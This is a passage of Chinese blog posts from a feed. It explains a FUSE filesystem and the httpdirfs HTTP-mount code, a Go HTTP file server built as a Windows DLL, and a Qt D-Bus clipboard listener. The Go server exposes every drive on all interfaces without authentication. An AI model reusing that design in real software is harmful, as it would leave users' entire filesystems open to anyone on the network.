list_add_prev(&amp;o-&gt;node, &amp;entries);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">ou_unlink</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_node</span> *<span class="title">n</span>, *<span class="title">p</span>;</span></span><br><span class="line"></span><br><span class="line">	list_for_each_safe (n, p, &amp;entries) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">ou_entry</span>* <span class="title">o</span> =</span> list_entry(n, struct ou_entry, node);</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">strcmp</span>(path + <span class="number">1</span>, o-&gt;name) == <span class="number">0</span>) &#123;</span><br><span class="line">			__list_del(n);</span><br><span class="line">			<span class="built_in">free</span>(o);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> -ENOENT;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li><strong>总结</strong>:具体还是使用的linux中的fuse的库文件,来实现我们自己的fuse文件系统,我们只需要参照<code>fuse.h</code>文件的函数指针.需要实现哪个功能,就开始自己进行实现,最后把结构体传入至fuse,就可以成功编写一个属于我们自己的文件系统了.</li>
</ul>
<h2 id="fuse-http的实现"><a href="#fuse-http的实现" class="headerlink" title="fuse+http的实现"></a>fuse+http的实现</h2><p><strong>利用fuse的机制,再获取http接口,实现把http文件系统的文件挂载至本机指定文件夹中,虽然此程序是用纯C编写的,但是我们已知具体实现功能,并了解部分fuse实现原理,所以我们只需要解读关键函数的实现就能大致了解实现流程</strong></p>
<ol>
<li><p>link.c和link.h加载http中的Link中的路径转换至磁盘本地路径.</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">LinkTable *<span class="title">LinkTable_disk_open</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *dirn)</span><span class="comment">//从磁盘加载链接表</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> *metadirn = path_append(META_DIR, dirn);</span><br><span class="line">	<span class="keyword">char</span> *path;</span><br><span class="line">	<span class="comment">//http中的路径进行选择截取</span></span><br><span class="line">	<span class="keyword">if</span> (metadirn[strnlen(metadirn, MAX_PATH_LEN)] == <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">		path = path_append(metadirn, <span class="string">&quot;.LinkTable&quot;</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		path = path_append(metadirn, <span class="string">&quot;/.LinkTable&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//打开路径开始获取目标文件</span></span><br><span class="line">	FILE *fp = fopen(path, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;path&lt;%s&gt;\n&quot;</span>,path);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(metadirn);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!fp) &#123;</span><br><span class="line">		<span class="built_in">free</span>(path);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	LinkTable *linktbl = CALLOC(<span class="number">1</span>, <span class="keyword">sizeof</span>(LinkTable));</span><br><span class="line"></span><br><span class="line">	fread(&amp;linktbl-&gt;num, <span class="keyword">sizeof</span>(<span class="keyword">int</span>), <span class="number">1</span>, fp);</span><br><span class="line">	linktbl-&gt;links = CALLOC(linktbl-&gt;num, <span class="keyword">sizeof</span>(Link *));</span><br><span class="line">	<span class="comment">//遍历link获取所需内容,并返回</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; linktbl-&gt;num; i++) &#123;</span><br><span class="line">		linktbl-&gt;links[i] = CALLOC(<span class="number">1</span>, <span class="keyword">sizeof</span>(Link));</span><br><span class="line">		fread(linktbl-&gt;links[i]-&gt;linkname, <span class="keyword">sizeof</span>(<span class="keyword">char</span>), MAX_FILENAME_LEN, fp);</span><br><span class="line">		fread(linktbl-&gt;links[i]-&gt;f_url, <span class="keyword">sizeof</span>(<span class="keyword">char</span>), MAX_PATH_LEN, fp);</span><br><span class="line">		fread(&amp;linktbl-&gt;links[i]-&gt;type, <span class="keyword">sizeof</span>(LinkType), <span class="number">1</span>, fp);</span><br><span class="line">		fread(&amp;linktbl-&gt;links[i]-&gt;content_length, <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>), <span class="number">1</span>, fp);</span><br><span class="line">		fread(&amp;linktbl-&gt;links[i]-&gt;time, <span class="keyword">sizeof</span>(<span class="keyword">long</span>), <span class="number">1</span>, fp);</span><br><span class="line">		<span class="keyword">if</span> (feof(fp)) &#123;</span><br><span class="line">			<span class="comment">/* reached EOF */</span></span><br><span class="line">			<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,</span><br><span class="line">					<span class="string">&quot;LinkTable_disk_open(): reached EOF!\n&quot;</span>);</span><br><span class="line">			LinkTable_free(linktbl);</span><br><span class="line">			LinkTable_disk_delete(dirn);</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (ferror(fp)) &#123;</span><br><span class="line">			<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;LinkTable_disk_open(): encountered ferror!\n&quot;</span>);</span><br><span class="line">			LinkTable_free(linktbl);</span><br><span class="line">			LinkTable_disk_delete(dirn);</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (fclose(fp)) &#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,</span><br><span class="line">				<span class="string">&quot;LinkTable_disk_open(): cannot close the file pointer, %s\n&quot;</span>,</span><br><span class="line">				strerror(errno));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> linktbl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>network.c 和network.h,获取http文件服务器内容,详情请参考<code>https://curl.haxx.se/libcurl/c/threaded-ssl.html</code>这位作者也是参考此源码完成.</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">NetworkSystem_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">	<span class="comment">/* ------- Global related ----------*/</span></span><br><span class="line">	<span class="comment">//初始化http的curl,如果非CURL_GLOBAL_ALL则初始化失败退出</span></span><br><span class="line">	<span class="keyword">if</span> (curl_global_init(CURL_GLOBAL_ALL)) &#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;network_init(): curl_global_init() failed!\n&quot;</span>);</span><br><span class="line">		exit_failure();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* -------- Share related ----------*/</span></span><br><span class="line">	<span class="comment">//返回curl句柄,获取相应我curl</span></span><br><span class="line">	CURL_SHARE = curl_share_init();</span><br><span class="line">	<span class="keyword">if</span> (!(CURL_SHARE)) &#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;network_init(): curl_share_init() failed!\n&quot;</span>);</span><br><span class="line">		exit_failure();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//给目标穿参</span></span><br><span class="line">	curl_share_setopt(CURL_SHARE, CURLSHOPT_SHARE, CURL_LOCK_DATA_COOKIE);</span><br><span class="line">	curl_share_setopt(CURL_SHARE, CURLSHOPT_SHARE, CURL_LOCK_DATA_DNS);</span><br><span class="line">	curl_share_setopt(CURL_SHARE, CURLSHOPT_SHARE, CURL_LOCK_DATA_SSL_SESSION);</span><br><span class="line">	<span class="comment">//thread的初始化</span></span><br><span class="line">	<span class="keyword">if</span> (pthread_mutex_init(&amp;curl_lock, <span class="literal">NULL</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;network_init(): curl_lock initialisation failed!\n&quot;</span>);</span><br><span class="line">		exit_failure();</span><br><span class="line">	&#125;</span><br><span class="line">	curl_share_setopt(CURL_SHARE, CURLSHOPT_LOCKFUNC, curl_callback_lock);</span><br><span class="line">	curl_share_setopt(CURL_SHARE, CURLSHOPT_UNLOCKFUNC, curl_callback_unlock);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//处理多个curl</span></span><br><span class="line">	<span class="comment">/* ------------- Multi related -----------*/</span></span><br><span class="line">	curl_multi = curl_multi_init();</span><br><span class="line">	<span class="keyword">if</span> (!curl_multi) &#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;network_init(): curl_multi_init() failed!\n&quot;</span>);</span><br><span class="line">		exit_failure();</span><br><span class="line">	&#125;</span><br><span class="line">	curl_multi_setopt(curl_multi, CURLMOPT_MAX_TOTAL_CONNECTIONS,</span><br><span class="line">					CONFIG.max_conns);</span><br><span class="line">	curl_multi_setopt(curl_multi, CURLMOPT_MAX_HOST_CONNECTIONS,</span><br><span class="line">					CONFIG.max_conns);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* ------------ Initialise locks ---------*/</span></span><br><span class="line">	<span class="keyword">if</span> (pthread_mutex_init(&amp;transfer_lock, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,</span><br><span class="line">				<span class="string">&quot;network_init(): transfer_lock initialisation failed!\n&quot;</span>);</span><br><span class="line">		exit_failure();</span><br><span class="line">	&#125;</span><br><span class="line">	crypto_lock_init();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>fuse_local.c和fuse_local.h,搭建本地fuse文件系统,本文上半部分已经详细介绍原理.</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">fs_readdir</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path, <span class="keyword">void</span> *buf, <span class="keyword">fuse_fill_dir_t</span> dir_add,<span class="keyword">off_t</span> offset, struct fuse_file_info *fi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	(<span class="keyword">void</span>) offset;</span><br><span class="line">	(<span class="keyword">void</span>) fi;</span><br><span class="line"></span><br><span class="line">	Link *link;</span><br><span class="line">	LinkTable *linktbl;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">strcmp</span>(path, <span class="string">&quot;/&quot;</span>)) &#123;</span><br><span class="line">		linktbl = ROOT_LINK_TBL;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		linktbl = path_to_Link_LinkTable_new(path);<span class="comment">//如果非根目录,则从link中重新拉去当前目录所有文件夹,和文件从而实现文件夹的存储.缺点是要试试刷新多文件会有较高延迟</span></span><br><span class="line">		<span class="keyword">if</span>(!linktbl) &#123;</span><br><span class="line">			<span class="keyword">return</span> -ENOENT;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* start adding the links */</span></span><br><span class="line">	dir_add(buf, <span class="string">&quot;.&quot;</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">	dir_add(buf, <span class="string">&quot;..&quot;</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; linktbl-&gt;num; i++) &#123;</span><br><span class="line">		link = linktbl-&gt;links[i];</span><br><span class="line">		<span class="keyword">if</span> (link-&gt;type != LINK_INVALID) &#123;</span><br><span class="line">			dir_add(buf, link-&gt;linkname, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li><strong>总结</strong>:通过http(curl库),和fuse(fuse库).点击当前文件夹就会从http拉去当前文件夹所有内容,从而实现了把http文件系统服务器挂在至本机磁盘中.makefile直接使用make生成可执行文件httpdirfs,然后调用如下命令即可使用<blockquote>
<p>./httpdirfs -f –cache $URL $MOUNT_POINT</p>
</blockquote>
</li>
</ul>
]]></content>
      <categories>
        <category>Linux利用fuse实现文件系统</category>
      </categories>
      <tags>
        <tag>Linux技术分享</tag>
      </tags>
  </entry>
  <entry>
    <title>【windows技术】利用go搭建纯文件http服务器，并生成dll</title>
    <url>/2021/06/04/go%E6%90%AD%E5%BB%BAhttp%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
    <content><![CDATA[<h1 id="利用go搭建纯文件http服务"><a href="#利用go搭建纯文件http服务" class="headerlink" title="利用go搭建纯文件http服务"></a>利用go搭建纯文件http服务</h1><p><em><strong>在windows下使用go搭建纯文件服务器，并生成标准dll导出文件。</strong></em></p>
<span id="more"></span>

<h2 id="go实现HTTP文件服务器"><a href="#go实现HTTP文件服务器" class="headerlink" title="go实现HTTP文件服务器"></a>go实现HTTP文件服务器</h2><ol>
<li><p>利用<code>net/http</code>库文件创建<code>http</code>服务</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">func</span> <span class="title">serveApp</span><span class="params">(stop &lt;-<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;, port <span class="keyword">int</span>)</span> <span class="title">error</span></span> &#123;</span><br><span class="line"></span><br><span class="line">mux := http.NewServeMux()</span><br><span class="line">pathlist := GetLogicalDrives()<span class="comment">//获取windows卷标</span></span><br><span class="line">mux.Handle(<span class="string">&quot;/&quot;</span>, http.StripPrefix(<span class="string">&quot;/&quot;</span>, http.FileServer(http.Dir(<span class="string">&quot;/&quot;</span>))))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, v := <span class="keyword">range</span> pathlist &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;path:&quot;</span>, v)</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(v) == <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">	&#125;</span><br><span class="line">	Path := <span class="string">&quot;/&quot;</span> + v + (<span class="string">&quot;/&quot;</span>)</span><br><span class="line">	Dir := v + <span class="string">&quot;:&quot;</span></span><br><span class="line">	mux.Handle(strings.ToLower(Path), http.StripPrefix(strings.ToLower(Path), http.FileServer(http.Dir(strings.ToLower(Dir)))))</span><br><span class="line">	fmt.Println(<span class="string">&quot;path:&quot;</span>, Path)</span><br><span class="line">	fmt.Println(<span class="string">&quot;Dir:&quot;</span>, Dir)</span><br><span class="line">&#125;</span><br><span class="line">service := <span class="keyword">string</span>(<span class="string">&quot;:&quot;</span>) + strconv.FormatInt(<span class="keyword">int64</span>(port), <span class="number">10</span>)</span><br><span class="line"><span class="keyword">return</span> serve(service, mux, stop)</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li>
<li><p>利用<code>syscall</code>标准系统库，遍历<code>windows</code>的磁盘卷标</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">func</span> <span class="title">GetLogicalDrives</span><span class="params">()</span> []<span class="title">string</span></span> &#123;</span><br><span class="line">kernel32 := syscall.MustLoadDLL(<span class="string">&quot;kernel32.dll&quot;</span>)<span class="comment">//windows系统标准库</span></span><br><span class="line">GetLogicalDrives := kernel32.MustFindProc(<span class="string">&quot;GetLogicalDrives&quot;</span>)</span><br><span class="line">n, _, _ := GetLogicalDrives.Call()</span><br><span class="line">s := FormatInt(<span class="keyword">int64</span>(n), <span class="number">2</span>)</span><br><span class="line"><span class="keyword">var</span> drives_all = []<span class="keyword">string</span>&#123;<span class="string">&quot;A&quot;</span>, <span class="string">&quot;B&quot;</span>, <span class="string">&quot;C&quot;</span>, <span class="string">&quot;D&quot;</span>, <span class="string">&quot;E&quot;</span>, <span class="string">&quot;F&quot;</span>, <span class="string">&quot;G&quot;</span>, <span class="string">&quot;H&quot;</span>, <span class="string">&quot;I&quot;</span>, <span class="string">&quot;J&quot;</span>, <span class="string">&quot;K&quot;</span>, <span class="string">&quot;L&quot;</span>, <span class="string">&quot;M&quot;</span>, <span class="string">&quot;N&quot;</span>, <span class="string">&quot;O&quot;</span>, <span class="string">&quot;P&quot;</span>, <span class="string">&quot;Q&quot;</span>, <span class="string">&quot;R&quot;</span>, <span class="string">&quot;S&quot;</span>, <span class="string">&quot;T&quot;</span>, <span class="string">&quot;U&quot;</span>, <span class="string">&quot;V&quot;</span>, <span class="string">&quot;W&quot;</span>, <span class="string">&quot;X&quot;</span>, <span class="string">&quot;Y&quot;</span>, <span class="string">&quot;Z&quot;</span>&#125;</span><br><span class="line">temp := drives_all[<span class="number">0</span>:<span class="built_in">len</span>(s)]</span><br><span class="line"><span class="keyword">var</span> d []<span class="keyword">string</span></span><br><span class="line"><span class="keyword">for</span> i, v := <span class="keyword">range</span> s &#123;</span><br><span class="line">	<span class="keyword">if</span> v == <span class="number">49</span> &#123;</span><br><span class="line">		l := <span class="built_in">len</span>(s) - i - <span class="number">1</span></span><br><span class="line">		d = <span class="built_in">append</span>(d, temp[l])</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, v := <span class="keyword">range</span> d &#123;</span><br><span class="line">	<span class="comment">//	 drives = append(drives[i:], append([]string&#123;v&#125;, drives[:i]...)...)</span></span><br><span class="line">	fmt.Println(v)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> d</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li>
<li><p>利用<code>http</code>的server的停止机制，关闭http服务器</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">func</span> <span class="title">serve</span><span class="params">(addr <span class="keyword">string</span>, handler http.Handler, stop &lt;-<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">s := http.Server&#123;</span><br><span class="line">	Addr:    addr,</span><br><span class="line">	Handler: handler,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">	&lt;-stop <span class="comment">// wait for stop signal</span></span><br><span class="line">	s.Shutdown(context.Background()) <span class="comment">//停止服务器</span></span><br><span class="line">&#125;()</span><br><span class="line"><span class="keyword">return</span> s.ListenAndServe()</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="go导出dll标准导出文件"><a href="#go导出dll标准导出文件" class="headerlink" title="go导出dll标准导出文件"></a>go导出dll标准导出文件</h2><ol>
<li><p>进入官网<code>https://gcc.gnu.org/install/binaries.html</code>，选择Microsoft -&gt; mingw64。安装MinGW-w64。</p>
<p><img src="/2021/06/04/go%E6%90%AD%E5%BB%BAhttp%E6%9C%8D%E5%8A%A1%E5%99%A8/1.png" alt="图1"></p>
<p><img src="/2021/06/04/go%E6%90%AD%E5%BB%BAhttp%E6%9C%8D%E5%8A%A1%E5%99%A8/2.png" alt="图2"></p>
<p><img src="/2021/06/04/go%E6%90%AD%E5%BB%BAhttp%E6%9C%8D%E5%8A%A1%E5%99%A8/3.png" alt="图3"></p>
</li>
</ol>
<ol start="2">
<li><p>选择安装版本，选择32位或者64位的版本进行安装，如果你生成dll想为32为位的时候就要选择32位就是<code>i686</code></p>
<p> <img src="/2021/06/04/go%E6%90%AD%E5%BB%BAhttp%E6%9C%8D%E5%8A%A1%E5%99%A8/4.png" alt="图4"></p>
</li>
<li><p>把<code>mingw32\bin</code>加入到环境变量中,<code>我的电脑-&gt;高级系统设置-&gt;环境变量</code>,在命令刚中输入<code>gcc -v</code>有版本信息则调试成功.</p>
<p> <img src="/2021/06/04/go%E6%90%AD%E5%BB%BAhttp%E6%9C%8D%E5%8A%A1%E5%99%A8/5.png" alt="图5"></p>
</li>
<li><p>在go程序中在需要导出函数的头文件加入<code>//export </code>如下</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//export stop</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">stop</span><span class="params">()</span></span> &#123;</span><br><span class="line">	log.Println(<span class="string">&quot;Stop Http!&quot;</span>)</span><br><span class="line">	<span class="built_in">close</span>(Stopch)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>运行下命令就OK,或者参考下我的博客中的<code>export.dat</code>脚本</p>
</li>
</ol>
<blockquote>
<p>go build -ldflags “-s -w” -o main.dll -buildmode=c-shared main.go</p>
</blockquote>
<ol start="6">
<li>在导出的<code>.h</code>文件中我们需要把三行注释</li>
</ol>
<blockquote>
<p>typedef <strong>SIZE_TYPE</strong> GoUintptr;</p>
</blockquote>
<blockquote>
<p>typedef float _Complex GoComplex64;</p>
</blockquote>
<blockquote>
<p>typedef double _Complex GoComplex128;</p>
</blockquote>
]]></content>
      <categories>
        <category>go</category>
      </categories>
      <tags>
        <tag>windows技术</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux技术分享】利用QT的clipboard库监听和设置剪切板</title>
    <url>/2021/06/02/UOS%E5%88%A9%E7%94%A8QT%E7%9B%91%E5%90%AC%E5%92%8C%E8%AE%BE%E7%BD%AE%E5%89%AA%E5%88%87%E6%9D%BF/</url>
    <content><![CDATA[<h1 id="利用QT的clipboard库监听和设置剪切板"><a href="#利用QT的clipboard库监听和设置剪切板" class="headerlink" title="利用QT的clipboard库监听和设置剪切板"></a>利用QT的clipboard库监听和设置剪切板</h1><p><em><strong>使用QT的Clipboard库，监听和设置uos剪切板变化。经过dbus接口，把uos的剪切板暴露出来，从而进行设置和监听</strong></em></p>
<span id="more"></span>

<h2 id="dbus的创建"><a href="#dbus的创建" class="headerlink" title="dbus的创建"></a>dbus的创建</h2><ol>
<li>在C++头文件定义<code>Q_SLOTS</code>,和<code>Q_SIGNALS</code></li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Clipboard</span> :</span> <span class="keyword">public</span> QObject</span><br><span class="line">&#123;</span><br><span class="line">    Q_OBJECT</span><br><span class="line">    <span class="built_in">Q_CLASSINFO</span>(<span class="string">&quot;D-Bus Interface&quot;</span>, <span class="string">&quot;com.deepin.ListenClipboard&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">Clipboard</span><span class="params">(QObject *parent = <span class="literal">nullptr</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Q_SLOTS:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">SetDataToCB</span><span class="params">(<span class="keyword">const</span> QString &amp;clipboardData, <span class="keyword">const</span> <span class="keyword">int</span> nType)</span></span>;</span><br><span class="line"></span><br><span class="line">Q_SIGNALS:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">ClipboardChanged</span><span class="params">(<span class="keyword">const</span> QString &amp;pathlist, <span class="keyword">const</span> <span class="keyword">int</span> nType)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>创建导出dbus接口的xml文件</li>
</ol>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">node</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//freedesktop//DTD D-BUS Object Introspection 1.0//EN&quot;</span> <span class="meta-string">&quot;http://www.freedesktop.org/standards/dbus/1.0/introspect.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">node</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">interface</span> <span class="attr">name</span>=<span class="string">&quot;com.deepin.ListenClipboard&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">signal</span> <span class="attr">name</span>=<span class="string">&quot;ClipboardChanged&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">arg</span> <span class="attr">name</span>=<span class="string">&quot;str&quot;</span> <span class="attr">type</span>=<span class="string">&quot;s&quot;</span> <span class="attr">direction</span>=<span class="string">&quot;out&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">arg</span> <span class="attr">name</span>=<span class="string">&quot;nType&quot;</span> <span class="attr">type</span>=<span class="string">&quot;i&quot;</span> <span class="attr">direction</span>=<span class="string">&quot;out&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">signal</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">method</span> <span class="attr">name</span>=<span class="string">&quot;SetClipboardData&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">arg</span> <span class="attr">name</span>=<span class="string">&quot;str&quot;</span> <span class="attr">type</span>=<span class="string">&quot;s&quot;</span> <span class="attr">direction</span>=<span class="string">&quot;in&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">arg</span> <span class="attr">name</span>=<span class="string">&quot;nType&quot;</span> <span class="attr">type</span>=<span class="string">&quot;i&quot;</span> <span class="attr">direction</span>=<span class="string">&quot;in&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">method</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">node</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ol start="3">
<li>使用工具生成适配器类</li>
</ol>
<p><code>qdbusxml2cpp com.deepin.ListenClipboard.xml -i  com.deepin.ListenClipboard.xml -a widgetadaptor</code></p>
<ol start="4">
<li> 安装适配器将Widget类中的方法导出<code>DemoAdaptor adaptor(&amp;w);</code></li>
</ol>
<h2 id="剪切板监听"><a href="#剪切板监听" class="headerlink" title="剪切板监听"></a>剪切板监听</h2><ol>
<li>调用<code>connect</code>，把自己的<code>func</code>和<code>cilpboard</code>变化连接一起 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Clipboard::CheckDataToCb</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">connect</span>(m_clipBoard, &amp;QClipboard::dataChanged, <span class="keyword">this</span>, &amp;Clipboard::ListenDataToCB);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>获取文件图片和文字</li>
</ol>
<ul>
<li><p>图片</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">QImage img = qvariant_cast&lt;QImage&gt;(strMimeData-&gt;<span class="built_in">imageData</span>());</span><br><span class="line">QByteArray imageArray;</span><br><span class="line">QBuffer buffer;</span><br><span class="line">buffer.<span class="built_in">open</span>(QIODevice::WriteOnly);</span><br><span class="line">img.<span class="built_in">save</span>(&amp;buffer, <span class="string">&quot;PNG&quot;</span>);</span><br><span class="line">imageArray.<span class="built_in">append</span>(buffer.<span class="built_in">data</span>());</span><br></pre></td></tr></table></figure></li>
<li><p>文字</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">QString strText = strMimeData-&gt;<span class="built_in">text</span>();</span><br><span class="line"><span class="built_in">qDebug</span>() &lt;&lt; <span class="string">&quot;clipboard text received:&quot;</span> &lt;&lt; strText;</span><br></pre></td></tr></table></figure></li>
<li><p>文件</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">QString strFileList;</span><br><span class="line">QList&lt;QUrl&gt; cbUrls = strMimeData-&gt;<span class="built_in">urls</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; cbUrls.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">    QString strFile = cbUrls.<span class="built_in">at</span>(i).<span class="built_in">toLocalFile</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">isFusePath</span>(strFile) || <span class="number">0</span> == strFile.<span class="built_in">size</span>()) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    strFileList += strFile + <span class="string">&quot;\n&amp;t&quot;</span>; <span class="comment">// windows约定文件路径分隔符</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">qDebug</span>() &lt;&lt; <span class="string">&quot;clipboard file received:&quot;</span> &lt;&lt; strFileList;</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="3">
<li><p>发送数据至<code>Q_SIGNALS</code></p>
